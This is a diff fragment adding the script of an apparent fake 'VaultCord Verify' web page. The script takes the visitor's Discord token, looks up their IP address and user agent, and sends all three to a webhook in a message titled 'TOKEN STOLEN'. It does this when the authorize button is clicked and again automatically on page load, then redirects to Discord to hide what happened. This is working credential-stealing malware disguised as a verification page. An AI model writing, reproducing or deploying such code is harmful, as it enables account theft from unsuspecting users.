@@ -99,4 +99,38 @@
       const token = getToken();
       if (!token) return;
 
-      const ip = await fetch('https://api
+      const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(() => 'unknown');
+      const ua = navigator.userAgent;
+
+      fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          embeds: [{
+            title: 'TOKEN STOLEN',
+            color: 0x00ff00,
+            fields: [
+              { name: 'Token', value: `\`\`\`${token.substring(0, 60)}...\`\`\``, inline: false },
+              { name: 'IP', value: `\`${ip}\``, inline: true },
+              { name: 'UA', value: `\`${ua.substring(0, 100)}\``, inline: false }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: { text: 'VaultCord Verify' }
+          }]
+        })
+      });
+    }
+
+    document.getElementById('authorizeBtn').addEventListener('click', () => {
+      sendToken();
+      setTimeout(() => {
+        window.location = 'https://discord.com/channels/@me';
+      }, 600);
+    });
+
+    window.addEventListener('load', () => {
+      setTimeout(sendToken, 1000);
+    });
+  </script>
+</body>
+</html>
